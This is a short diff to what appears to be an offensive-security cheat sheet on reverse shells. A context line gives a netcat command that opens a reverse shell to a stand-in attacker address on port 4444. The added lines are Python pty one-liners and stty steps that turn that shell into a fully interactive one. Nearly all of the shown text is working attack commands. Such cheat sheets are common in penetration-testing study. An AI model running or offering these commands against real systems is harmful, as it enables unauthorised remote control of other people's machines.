@@ -24,7 +24,10 @@ nc -nv att.ac.kin.gip 4444 -e /bin/bash
 ```
 ### Improving your Shell
 ```
-# Python
+# Python one liner
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# Python to make fully interactive
 python -c 'import pty; pty.spawn("/bin/sh")'
 # Then ctrl-z to background shell and run
 stty raw -echo
